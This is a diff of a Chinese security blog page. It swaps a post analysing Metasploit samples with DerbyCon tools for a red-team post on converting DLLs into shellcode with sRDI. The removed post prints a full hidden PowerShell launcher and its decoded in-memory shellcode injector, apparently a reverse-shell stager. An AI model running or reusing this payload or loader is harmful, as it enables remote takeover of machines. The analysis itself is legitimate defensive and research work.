@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>DerbyCon工具使用 | 九世的博客</title>
-  <meta name="keywords" content=" 恶意分析 ">
-  <meta name="description" content="DerbyCon工具使用 | 九世的博客">
+  <title>DLL转shellcode研究 | 九世的博客</title>
+  <meta name="keywords" content=" 红队 ">
+  <meta name="description" content="DLL转shellcode研究 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1868,9 +1868,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-DerbyCon工具使用" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-DLL转shellcode研究" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">DerbyCon工具使用</h1>
+        <h1 class="article-title">DLL转shellcode研究</h1>
     
     <div class="article-meta">
         
@@ -1879,14 +1879,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color5">恶意分析</a>
+            <a href="javascript:" class="color3">红队</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2020-11-11 17:24:03">2020-11-11 16:45</time>
+        创建时间:<time class="date" title="更新时间: 2021-09-09 17:41:23">2021-09-09 17:18</time>
         
     </div>
     <div class="article-meta">
@@ -1908,7 +1908,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#分析示例"><span class="toc-text">分析示例</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#实现DLL加载两个方法"><span class="toc-text">实现DLL加载两个方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DLL加载原理"><span class="toc-text">DLL加载原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#工具的使用"><span class="toc-text">工具的使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#原理分析"><span class="toc-text">原理分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1923,65 +1923,74 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <p>这是PCsXcetra计划在2019年的Derbycon演讲中发布的一组工具，用于快捷的分析一下shellcode或者powershell/混淆解码等<br>仓库地址：<a href="https://github.com/PCsXcetra/DerbyCon-2019Files" target="_blank" rel="noopener">https://github.com/PCsXcetra/DerbyCon-2019Files</a></p>
-<h2 id="分析示例"><a href="#分析示例" class="headerlink" title="分析示例"></a>分析示例</h2><p>msf直接生成两个作为样本bin和psh-cmd</p>
-<p>Extract-IP-From-Meterpreter-ShellCode.exe - 分析shellcode获得其中里面的ip和port。（只适用于msf的shellcode，可以把exe/bin文件的hex提取出来然后去执行）<br><img src="https://s1.ax1x.com/2020/11/11/BjcKf0.png" alt="shellcode raw"></p>
-<p><img src="https://s1.ax1x.com/2020/11/11/Bjc3XF.png" alt="获取ip and port"></p>
-<p>Base64EncoderDecoder.exe - base64解码（适用于powershell那种base64编码的）<br>psh-cmd</p>
-<pre><code>%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAkAGUAbgB2ADoAdwBpAG4AZABpAHIAKwAnAFwAcwB5AHMAbgBhAHQAaQB2AGUAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQBlAGwAcwBlAHsAJABiAD0AJwBwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAJwB9ADsAJABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBTAHQAYQByAHQASQBuAGYAbwA7ACQAcwAuAEYAaQBsAGUATgBhAG0AZQA9ACQAYgA7ACQAcwAuAEEAcgBnAHUAbQBlAG4AdABzAD0AJwAtAG4AbwBwACAALQB3ACAAaABpAGQAZABlAG4AIAAtAGMAIAAmACgAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAYwByAGUAYQB0AGUAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AKAAsAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnACcASAA0AHMASQBBAEYAaAAvAHEAMQA4AEMAQQA3AFYAVwBiAFcAKwBiAFMAQgBEACsAbgBFAGoAOQBEADYAaQB5AFoARgBBAGMAZwAxAE0AMwA1ADQAdABVADYAUQBCAEQAagBHAHQAUwBFADIAegBzADIARwBlAGQAQwBDAHkAdwA5AGIATAA0AFkASQBsAE4AZQB2ADMAdgBOADIAdgBqAE4ARgBYAFQAcQBqADMAcABFAEIATAA3AE0AaQAvAFAAUABEAE8ANwBRADEAVABTAGcATwBHAE0AQwBxAHcAbgBmAEgAcAAxAGUAagBMADIAYwB6ADgAVgB4AEUAYgBzAFAAYgBhAEUAQgBqAEkAZAA2AGUAUQBFAGwAaAB0AFYAZgBoAE0ASwA3AHcAUgB4AHEAVwA0ADIALwBTAHoAMQBNAFYAMQBkAFgAZQBsAGwAbgBpAFAASwBEAHYAUAAyAE4AVwBKAHEAVQBhAEQAMABuAG0AQgBVAGkASgBMAHcAagB6AEIATABVAEkANwBPAFAAOQB4AC8AUgBBAEUAVABQAGcAbQBOAHYAOQByAFgASgBMAHYAMwBTAFMAMQBXADYAWAA2AFEASQBPAEYAYwBwAFMASABmAEcAMgBXAEIAegA2AEcAMAAzAFEAMwBCAFQARwB6ACsAKwBXAGQAVABXAHAANQAzAFYAbQAzAGoANwA5AEkAbgBoAGQAaAAwAHEANABLAGgAdABCADAAUwAwAHAAUwBFAHoAeABKADMATwBLAGsAMgBTAEcAegBhAE8ATQBpAHoASQBvAHQAWQBlADQAYgBwAG0ANAB2ADIAbABCAFoAKwBoAEcANwBBADIAZwBPAHkARQBVAHUAeQBzAEcAaABLAEUAQQBXADgATwBXAEoAbABUAG8AVgA5AFAATgB6AEEAWQBWAHQAcwB3AG4AQwBjAFoANABFAGEAaABqAGsAcQBpAG0AWgBMAFcASABMAFQAeQA5AFgAcQBEADMARgBaACsANwAwAHQASwBjAE0AcABhAGwAdQBVAG8AVAB6AGIAdQBDAGgALwB3AEEARQBxADIAZwBPAGYAaABnAFQAZABvAG0AZwBGAFcAaQA3AEwATQBZADEAWABrAGcAUgBpAEQAOQBrAGEAaQBRADEAYQBFAHQASQBTAGYAcwBXAE0AZQBJAE8AMgBSADkAWgArAFYAawBsADgAcgBnAFIAUwBZADUAWgBMAEwAYwBqAGoAQwAzAEgAYQBXAFYAZwBTAGQATgBCAHMAdgBnAEMAVQA1ADEANgBDAHAAOAA0AC8ARQBQAGYANQAxAGUAbQByADAAKwBoAFkASwBWAHYAcgBlAGEAWABBADYARwBTADUASAB5AE8AQQBKAG8ANgB6AEEAdQArAGwAMwBnAGwASwBTADcARABCAGkAYwArAHkAdgBJAEoAcABZADUASwBYAFMARgBvADkARQBTAHMAMAA0AHAAMwBmACsAcgA1ADYANQB5AGcATABrAHEAbgBuAFgAVgA3AEEAMgB0AEwATABjAEwAZwBDAG4AVABxAGIAagBSAFEAaAB6AGUAVQBiADMAeQAvAEwAUABvAG8AdwBSAGYAMgBLACsAaQBrAE8AagBwAFUAbgB2AHMAUQB4AGkAZwBqAGEAaAA5AGcAKwBpAHQAMABBAEwATABGAFoAYgA2AEMAdwBqAHcAaQBLAGYAYwBaAFoANAA2AG4AKwBSAHMAMQBJAE0AWAB2AFMAMQBVAHAATQBRAHAAUwByAEEAZQBTAHAAQQBGAFMAUQBRAHUAbAByAE0ASQBkAEUAaQBFADIATAAyAGkAZwBGAGsAZwA1AHoAcQBMADEARwBCAFAAVwBPAGoAdABKADEAagBWAGQASAA3ADMAdwBPAFEAawAyAGQAKwBFAFgAUgBFAHMAWQBsAEgATABpAGcASgBiAGoASQBKAHkAaABzAEMAUwBvAHQAYwBMADIAbABsAGkAegBiAEQANQB0AGYANABOAG8AbABZAFQAagB3AEMAMwBZADAAdAA1AEsAZQBpAEsAdwBkADYAaABrAHQAVwBGADQARwBrAEQAZwBJAGYAdQBKAHUAVQBJAEIAOQB3AHIAbABvAEMAUQBNAGMASQBxADEAeQBjAFgAeAAwADMASAB5AFIAQwBkADAAbgBCAE0ANABCAFcASABxAEEAVABNAEEASwBaADgAQgBsAHYAQgB4AHkAdwBNAGgAVABMADcAVgBkAHgASwB4ADAAUQAxAEEASwBJAHYAdQBUAGIAeABJAC8AaABuAE4AZQBGAC8AdQArAGYAUAB3AFkAaABjADEAdgBFAEIANgByACsAVgBDADYAbgBJAHcAagBDADgALwB3AFEAWQBaAGQAawByAEcAVwA0AE8ARwBjAHcAUQAzAEMAaQBkADAAWAAwAG4ALwB5AC8AKwB6AHUATwBDAEQAUgBjADEAUQBuAFEAegB3AGUAawBhAFYAVwBNAFYANwBhAEQAWgByAHkAbQBxAHgAcAAyAFoATwBRAE0AeQBEAEEAegBMAE4AVQA4AHcAdAAwADIAVAAxAGMARQArAEoAcgAyAGMARAA5AHQAKwBOACsAOQBxAGoAQwBZADUAaQAzAGoAcQBlADUAVQAyADkAaAAyAGUARwBRAHUAQgBaAHoANwB3AHcAOABtAGkAYQBKAGgAVAB0AFcARABQAE4AcQBhAHMAUgBqAHAAbQB6AGUAVAB5AGEARABvAGQAcwBmAHEASABsAC8AbAAwAFMAcQBWAFYAagBHAFEASwB1AGMAagBxAFkARwBBAC8AeQBiAE4AOQBTAG0AVQA5AEQARAArAHMAagA1AHUATABQAFUAVQBFAHYAagBlAFgAeQBuAGIANgAxAHgATQByAGYAQQBrAFQANgBLAHIAUgBpACsAbQBwAFUARQBtAHIASgBRAFkAawAwAHgAOQBaAEcAcgBKAFEAWgBXADEATgBoADEAQgBrADYAMwBzADcARABrAEgAdABIAHcAbwAyAHUANQA2AG0ARAAyADUATwAvAEoAagA5AEgAdABEAHUAYQA3AGkAWABwAGoARAA5AFgARQAvAEIAQwBhAG4AUQB0AHoAcgA3AC8AbQArAG8AdgAxADkAYQBoAHYANwBPAGMAQgBuAHoAdAAzAGgAWQBFAE4AOABHAE8AWQBkADQANgBYAG8ASgBtADMAMABXAGEARwB1AFgAQwA4AGoAUgBXAGYAYgBXAFAASABHADgAbABkAE0AOQBGAGcAMwBjAEsANwAwAGMAYQBWADQAZQBsADAAaABnADgAMABmAEwAUgBKADcAOQBFAEcAdQBJADYAMwBHAEcASwAwAHMARwBKAFUAeABhAHEAagBxAHUANABkAEoAZQA3ADkAVgBsAGMAMQBNADkAaQArAFQAMwBiAHIAcQBUAG0ARgB0AGYAWABFAG8AagB2AG4AZgBtAE8ASAAxAGQAMQBBAC8AdAAyAHoATQBkAHAAawBxAG0ATwBvAHEAawBuAGcAVABLAGEAcQB2ACsAMwBMAG4AVgBuADIAMwB2AEgAZQBPAGwATgBEADIAVgBWAFQAWgBiAGMAMQBQAHMAcABiAEEAdwArADMANgAvAG8ANwB2AGIANgA4AGoATwBXAG8ATwA1AFkAOQAxADYASQBEAFAAOQBFAEEAYgB6AFgAcwByAHYASAB3AEQAUABaAFMAMwAxAFAAdQBJAHQAbgBqAC8ATwBsAHIASwBqAC8AUwBPAGIAawBjADIAbgB0AE8ASQBSADQASABkAEQARABuAHoASQA5AHYAUQBlACsAZwBvAHoASgBxAHoAVwBYAFoAaQArAFYAWQBqAFkAaABuAHgAVAAwAG4AbgBtAGYAMAB3AGwAKwBEADcAVgBtAHMAQQBrAEsASQBFAFgASQBkAEQAUwAwADcAQQBLAHcARQByADYAZABuAGMANwBrAHoAQgBUAHgASwBPAHQAdwBwAEgARwBzADYANwBJAEcAOQBpAC8AVQBMAE4AdAAwAEUAdQBBADAAWAB2AHEAcAB4AEgATgByAHMATwBsAE4AbgA2ACsAdABMAHYAZQBxAE4AYgBZAGoARAA2ADQAQgBOADYAcABXAFQAMgBRAEIAcwBBAHUAWgB5ADMAZQBNADAAUQAzADcANwByAGsANgB2AFgAVwB0ACsARQBkADcAZgBhAHYASgBaAGUATwBmAEgAMgBzAEkATgBJAHIAMAAzAG0AbQBIAHYAUQBmAFoAZQA4AHkATQBBAFoANgBCAFIAUABHADYANwBuAFcAZgBGAC8AYgAzAEcAWgBQAHQANQBrAGYAZwBFAGkAaAA0ADYAegB2AEcAcQBNAGIAUABjAHIATAB2AEkATwBNAE4AYwBRAHgAVABoAHYAMgBPAE4AYwBvAG8ASQA5AEcAMwBvADcATQBmAEQAcQBoAEsAUwBCAGIAeQBEAFEAYgBlAEIAMwBuAG4AbwBhAEwAegBCAFQAbQBIADQANQB1AEwARgBrAFMAUQA4AEMAVQBwAGYAKwB0AHAAeAA2AGUAcABxAEEAUQBqAGgANwBOAE8AMABQAFUASQAwAFoAawBsAEwAMgBiADEAUgBGAEcAaABUAHkAcQA2AHIAUQBJAEEALwBIADUATwBlAGIAUwBwAG8AbQBHAG0ATABOADcAawBEAEoAdwBmAEQAWgBHADkAWQA0AHAAZABCAEkANQByAE4AdwAvACsAVABxAGYAbwBDAFMAdQBBAFQALwBwAGkAcABMADIAcwAvADIAUAAwAHAAOQBwAFIAVwBIAGUAMAAzADYAMQA4AHYALwBCAEsAYgB2AHgAagAzAHoATQBjAE0ANQBGAHkANABRAEEAawA2AHQAUABDAFgAdwBxADkAcgA0AHQAawBQAEQAawA4AEkANQBEAHkAcQBIAC8ANgBIACsAcQBGAGsANQB6AGYAdwAzAC8AUABxADkARgAvAEMAWABSAFQAbwBDAFEAcwBBAEEAQQA9AD0AJwAnACkAKQApACwAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAKQApACcAOwAkAHMALgBVAHMAZQBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJABzAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAdAA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAcwAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAByAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFMAdABhAHIAdAAoACQAcwApADsA
-</code></pre><p>base64解码一波<br>Base64EncoderDecoder.exe - base64解码（适用于powershell那种base64编码的）<br><img src="https://s1.ax1x.com/2020/11/11/BjgiNR.png" alt=""></p>
-<p>PS-Light-Format.exe - powershell代码美化<br><img src="https://s1.ax1x.com/2020/11/11/BjgTxK.png" alt=""></p>
-<p>美化后的psh</p>
-<pre><code class="powershell">if([IntPtr]::Size -eq 4){$b=$env:windir+&#39;\sysnative\WindowsPowerShell\v1.0\powershell.exe&#39;}else{$b=&#39;powershell.exe&#39;};
-$s=New-Object System.Diagnostics.ProcessStartInfo;
-$s.FileName=$b;
-$s.Arguments=&#39;-nop -w hidden -c &amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(&#39;&#39;H4sIAFh/q18CA7VWbW+bSBD+nEj9D6iyZFAcg1M354tU6QBDjGtSE2zs2GedCCyw9bL4YIlNev3vN2vjNFXTqj3pEBL7Mi/PPDO7Q1TSgOGMCqwnfHp1ejL2cz8VxEbsPbaEBjId6eQElhtVfhMK7wRxqW42/Sz1MV1dXellniPKDvP2NWJqUaD0nmBUiJLwjzBLUI7OP9x/RAETPgmNv9rXJLv3SS1W6X6QIOFcpSHfG2WBz6G03Q3BTGz++WdTWp53Vm3j79Inhdh0q4KhtB0S0pSEzxJ3OKk2SGzaOMizIotYe4bpm4v2lBZ+hG7A2gOyEUuysGhKEAW8OWJlToV9PNzAYVtswnCcZ4EahjkqimZLWHLTy9XqD3FZ+70tKcMpaluUoTzbuCh/wAEq2gOfhgTdomgFWi7LMY1XkgRiD9kaiQ1aEtISfsWMeIO2R9Z+Vkl8rgRSY5ZLLcjjC3HaWVgSdNBsvgCU516Cp84/EPf51emr0+hYKVvreaXA6GS5HyOAJo6zAu+l3glKS7DBic+yvIJpY5KXSFo9ESs04p3f+r565ygLkqnnXV7A2tLLcLgCnTqbjRQhzeUb3y/LPoowRf2K+ikOjpUnvsQxigjah9g+it0ALLFZb6CwjwiKfcZZ46n+Rs1IMXvS1UpMQpSrAeSpAFSQQulrMIdEiE2L2igFkg5zqL1GBPWOjtJ1jVdH73wOQk2d+EXREsYlHLigJbjIJyhsCSotcL2llizbD5tf4NolYTjwC3Y0t5KeiKwd6hktWF4GkDgIfuJuUIB9wrloCQMcIq1ycXx03HyRCd0nBM4BWHqATMAKZ8BlvBxywMhTL7VdxKx0Q1AKIvuTbxI/hnNeF/u+fPwYhc1vEB6r+VC6nIwjC8/wQYZdkrGW4OGcwQ3Cid0X0n/y/+zuOCDRc1QnQzwekaVWMV7aDZrymqxp2ZOQMyDAzLNU8wt02T1cE+Jr2cD9t+N+9qjCY5i3jqe5U29h2eGQuBZz7ww8miaJhTtWDPNqasRjpmzeTyaDodsfqHl/l0SqVVjGQKucjqYGA/ybN9SmU9DD+sj5uLPUUEvjeXynb61xMrfAkT6KrRi+mpUEmrJQYk0x9ZGrJQZW1Nh1Bk63s7DkHtHwo2u56mD25O/Jj9HtDua7iXpjD9XE/BCanQtzr7/m+ov19ahv7OcBnzt3hYEN8GOYd46XoJm30WaGuXC8jRWfbWPHG8ldM9Fg3cK70caV4el0hg80fLRJ79EGuI63GGK0sGJUxaqjqu4dJe79Vlc1M9i+T3brqTmFtfXEojvnfmOH1d1A/t2zMdpkqmOoqkngTKaqv+3LnVn23vHeOlND2VVTZbc1PspbAw+36/o7vb68jOWoO5Y916IDP9EAbzXsrvHwDPZS31PuItnj/OlrKj/SObkc2ntOIR4HdDDnzI9vQe+gozJqzWXZi+VYjYhnxT0nnmf0wl+D7VmsAkKIEXIdDS07AKwEr6dnc7kzBTxKOtwpHGs67IG9i/ULNt0EuA0XvqpxHNrsOlNn6+tLveqNbYjD64BN6pWT2QBsAuZy3eM0Q377rk6vXWt+Ed7favJZeOfH2sINIr03mmHvQfZe8yMAZ6BRPG67nWfF/b3GZPt5kfgEih46zvGqMbPcrLvIOMNcQxThv2ONcooI9G3o7MfDqhKSBbyDQbeB3nnoaLzBTmH45uLFkSQ8CUpf+tpx6epqAQjh7NO0PUI0ZklL2b1RFGhTyq6rQIA/H5OebSpomGmLN7kDJwfDZG9Y4pdBI5rNw/+TqfoCSuAT/pipL2s/2P0p9pRWHe03618v/BKbvxj3zMcM5Fy4QAk6tPCXwq9r4tkPDk8I5DyqH/6H+qFk5zfw3/Pq9F/CXRToCQsAAA==&#39;&#39;))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))&#39;;
-$s.UseShellExecute=$false;
-$s.RedirectStandardOutput=$true;
-$s.WindowStyle=&#39;Hidden&#39;;
-$s.CreateNoWindow=$true;
-$p=[System.Diagnostics.Process]::Start($s);
+        <p>昨天重新看到了dll转shellcode的文章想分析一下原理，所以<br>有了这篇文章。</p>
+<h2 id="实现DLL加载两个方法"><a href="#实现DLL加载两个方法" class="headerlink" title="实现DLL加载两个方法"></a>实现DLL加载两个方法</h2><p>1.从DIRECTORY_ENTRY_EXPORT寻找ReflectiveLoader函数，修补之后利用该函数加载DLL<br>2.实现一段LoadPE的shellcode，DLL跟在后面</p>
+<h2 id="DLL加载原理"><a href="#DLL加载原理" class="headerlink" title="DLL加载原理"></a>DLL加载原理</h2><blockquote>
+<p>启动一个可执行模块的时候,操作系统的加载程序会先为进程创建虚拟地址空间,接着把可执行模块映射到进程的地址空间中.之后加载程序会检查可执行模块的导入段, 试图对所需的DLL进行定位并将它们映射到进程的地址空间中. 由于导入段只包含DLL的名称,不包含DLL的路径,因此加载程序必须在用户的磁盘上搜索DLL. 下面是加载程序的搜索顺序: (1) 包含可执行文件的目录; (2) Windows的系统目录; GetSystemDirctory (3) 16位的系统目录, 即Windows/System (4) Windows目录 GetWindowsDirectory (5) 进程的当前目录; (6) PATH 环境变量中所列出的目录;</p>
+</blockquote>
+<h2 id="工具的使用"><a href="#工具的使用" class="headerlink" title="工具的使用"></a>工具的使用</h2><p><a href="https://github.com/monoxgas/sRDI/blob/7889036a75e3aca65a2c01ee8f5549ed779a4c1f/PowerShell/ConvertTo-Shellcode.ps1" target="_blank" rel="noopener">https://github.com/monoxgas/sRDI/blob/7889036a75e3aca65a2c01ee8f5549ed779a4c1f/PowerShell/ConvertTo-Shellcode.ps1</a></p>
+<pre><code class="powershell">import-module \.ConvertTo-Shellcode.ps1
+$c=ConvertTo-Shellcode .\test.dll
+$d=$c |%{write-output ([system.string]::format(&#39;{0:X2}&#39;,$_))}
+$d -join &quot;&quot; | Out-File shellcode.txt
 </code></pre>
-<p>$s.Arguments解析得到code<br><img src="https://s1.ax1x.com/2020/11/11/BjRqNd.png" alt=""></p>
-<pre><code class="powershell">function t8 {
-    Param ($gVz, $eFQ)        
-    $yrNd = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split(&#39;\\&#39;)[-1].Equals(&#39;System.dll&#39;) }).GetType(&#39;Microsoft.Win32.UnsafeNa
-tiveMethods&#39;)
-
-    return $yrNd.GetMethod(&#39;GetProcAddress&#39;, [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System
-.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($yrNd.GetMethod(&#39;GetModuleHandle&#39;)).Invoke($null, @($gVz)))), $eFQ))
-}
-
-function wI {
-    Param (
-        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $gxa,
-        [Parameter(Position = 1)] [Type] $mVV62 = [Void]
-    )
-
-    $meeBS = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#39;ReflectedDelegate&#39;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).Defin
-eDynamicModule(&#39;InMemoryModule&#39;, $false).DefineType(&#39;MyDelegateType&#39;, &#39;Class, Public, Sealed, AnsiClass, AutoClass&#39;, [System.MulticastDelegate])
-    $meeBS.DefineConstructor(&#39;RTSpecialName, HideBySig, Public&#39;, [System.Reflection.CallingConventions]::Standard, $gxa).SetImplementationFlags(&#39;Runtime, Managed&#39;)
-    $meeBS.DefineMethod(&#39;Invoke&#39;, &#39;Public, HideBySig, NewSlot, Virtual&#39;, $mVV62, $gxa).SetImplementationFlags(&#39;Runtime, Managed&#39;)
-
-    return $meeBS.CreateType()
-}
-
-[Byte[]]$nm = [System.Convert]::FromBase64String(&quot;/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z
-0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAA
-SYnlSbwCABFcwKhxkUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//
-Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V&quot;)
-
-
-$szw41 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((t8 kernel32.dll VirtualAlloc), (wI @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([Int
-Ptr]::Zero, $nm.Length,0x3000, 0x40)
-[System.Runtime.InteropServices.Marshal]::Copy($nm, 0, $szw41, $nm.length)
-
-$fWXd = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((t8 kernel32.dll CreateThread), (wI @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([Int
-Ptr]))).Invoke([IntPtr]::Zero,0,$szw41,[IntPtr]::Zero,0,[IntPtr]::Zero)
-[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((t8 kernel32.dll WaitForSingleObject), (wI @([IntPtr], [Int32]))).Invoke($fWXd,0xffffffff) | Out-Null
-
-</code></pre>
-<p>base64拿去Extract-IP-From-Meterpreter-ShellCode.exe查连接的ip和port<br><img src="https://s1.ax1x.com/2020/11/11/BjWl59.png" alt=""></p>
+<p>得到shellcode.txt py转换一下直接执行shellcode或者把得到的十六进制用010editor十六进制写入到某文件嵌套到资源里读取执行<br><img src="https://z3.ax1x.com/2021/09/09/hL2CM4.png" alt=""></p>
+<p>shellcode执行测试<br><img src="https://z3.ax1x.com/2021/09/09/hL28ot.png" alt=""></p>
+<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>它的原理是在不改变MZ标志的情况下把整个dll文件修补成可被当作shellcode加载的格式，具体的操作为在dll内导出自加载函数(ReflectiveLoader)然后讲MZ头起始字节修改成执行ReflectiveLoader函数的硬编码</p>
+<p>WBG的描述:</p>
+<blockquote>
+<p>其实所谓的修补反射dll其实就是修改dll头部让其变成汇编指令去调用ReflectiveLoader函数然后ReflectiveLoader函数会经过一系列处理最后会调用DllMain。这时这个dll就像shellcode一样可以直接执行，其实我们所做的就是解析dll找到ReflectiveLoader函数并将其地址硬编码写到Dll头部然后call</p>
+</blockquote>
+<p>自己实现具体过程：</p>
+<ol>
+<li>定位DLL文件在内存中的基址</li>
+<li>获取所需的系统API</li>
+<li>分配一片用来装载DLL的空间</li>
+<li>复制PE文件头和各个节</li>
+<li>处理DLL的引入表</li>
+<li>对DLL进行重定位</li>
+<li>调用DLL入口点</li>
+</ol>
+<p>目前网上的版本有两种：</p>
+<pre><code>* 带解压缩的版本：先把dll压缩然后在构造一段解压数据的C编译后提取ASM，然后将DLL拼接到后面 -&gt;看雪那个就是这样
+* 不带压缩版本：直接修补，去掉MZ头
+</code></pre><p>两个版本的都看了分析一下<br>带压缩版本的：利用RtlGetCompressionWorkSpaceSize和RtlCompressBuffer实现数据压缩，然后修补DLL<br><img src="https://z3.ax1x.com/2021/09/09/hLRQpT.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLRbEn.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLRvgU.png" alt=""></p>
+<p>WBG版本的修补:</p>
+<pre><code>* 从DIRECTORY_ENTRY_EXPORT寻找ReflectiveLoader函数，修补之后利用该函数加载DLL
+</code></pre><p><img src="https://z3.ax1x.com/2021/09/09/hLW3PP.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLWtKg.png" alt=""></p>
+<p>ConvertTo-Shellcode.py分析<br>-&gt;读取DLL数据，传入ConvertToShellcode() -&gt; 中间调用了一个HashFunctionName函数计算arguments.function_name<br><img src="https://z3.ax1x.com/2021/09/09/hLW05q.png" alt=""></p>
+<p>HashFunction函数<br><img src="https://z3.ax1x.com/2021/09/09/hLWfaR.png" alt=""><br>（计算函数hash）<br><img src="https://z3.ax1x.com/2021/09/09/hLWIG6.png" alt=""></p>
+<p>ConvertToShellcode函数<br>-&gt;判断DLL是否为64位<br>-&gt;根据对应的位数取LoadPE的shellcode<br>-&gt;bootstrap拼接对应的指令<br>-&gt;bootstrap + rdiShellcode + dllBytes + userData<br><img src="https://z3.ax1x.com/2021/09/09/hLWbse.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLWXdA.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLWzJP.png" alt=""></p>
+<p>大概如下：</p>
+<pre><code>call &lt;xxx&gt;
+pop eax
+push ebp
+mov ebp,esp
+mov edx,eax
+add eax,&lt;DLL偏移量&gt;
